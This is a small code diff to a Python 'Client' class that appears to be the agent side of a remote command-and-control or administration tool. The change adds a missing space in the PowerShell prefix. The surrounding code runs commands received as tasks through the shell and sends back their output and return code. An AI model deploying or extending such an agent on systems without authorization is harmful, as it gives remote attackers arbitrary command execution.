@@ -37,7 +37,7 @@ class Client:
             if task == "command":
                 command = task_json.get('command')
                 if platform.system() == "Windows":
-                    ps = subprocess.run("powershell -c" + command, shell=True, capture_output=True, text=True, timeout=60, check=True)
+                    ps = subprocess.run("powershell -c " + command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                 else:
                     ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                 data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
